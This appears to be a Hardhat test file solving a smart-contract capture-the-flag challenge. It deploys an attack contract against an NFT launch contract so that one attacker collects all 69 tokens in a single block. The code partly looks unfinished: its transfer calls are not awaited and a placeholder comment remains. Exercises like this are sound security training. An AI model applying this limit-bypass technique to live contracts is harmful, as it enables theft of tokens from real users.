import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";

const BN = BigNumber;
let precision = BN.from(10).pow(18);

let accounts: Signer[];
let attacker: Signer;
let o1: Signer;
let o2: Signer;
let admin: Signer; // should not be used
let flatLaunchpeg: Contract; 
let startBlock: Number;

/// preliminary state
before(async () => {

  accounts = await ethers.getSigners();
  [attacker, o1, o2, admin] = accounts;

  let flatLaunchpegFactory = await ethers.getContractFactory('FlatLaunchpeg')
  flatLaunchpeg = await flatLaunchpegFactory.connect(admin).deploy(69,5,5)

  startBlock = await ethers.provider.getBlockNumber()
  
});

it("solves the challenge", async function () {
    // const collectionSize = 69;
    // const maxperaddressduringmint = 5;

    const AttackContract = await ethers.getContractFactory("AttackContract");
    const attackContract = await AttackContract.connect(attacker).deploy(attacker.getAddress(), flatLaunchpeg.address);
  
    await attackContract.deployed();
  
    /** Interact with the AttackContract contract */
    const contract = await ethers.getContractAt("AttackContract", attackContract.address);


    //total addresses
    const alladdress = await contract.returnAlladdress();

      // Initialize the ID counter
  let idCounter = 0;

  // Loop through each contract address
  for (let i = 0; i < alladdress.length; i++) {
    const contractAddress = alladdress[i];
  
      // Calculate the number of NFTs to mint in the current contract
      const nftsToMintPerContract = (i === alladdress.length - 1) ? 4 : 5;
  
    
    // Mint the NFTs in the current contract
    for (let j = 0; j < nftsToMintPerContract; j++) {
        // Mint the NFT using the current contract and address
        flatLaunchpeg.connect(attacker).transferFrom(contractAddress, attacker.getAddress(), idCounter)

        idCounter++;
    }
    
  }

  // implement solution here

});

/// expected final state
after(async () => {

  expect(await flatLaunchpeg.totalSupply()).to.be.equal(69)
  expect(await flatLaunchpeg.balanceOf(await attacker.getAddress())).to.be.equal(69)
  expect(await ethers.provider.getBlockNumber()).to.be.equal(startBlock.valueOf()+1)
  
});
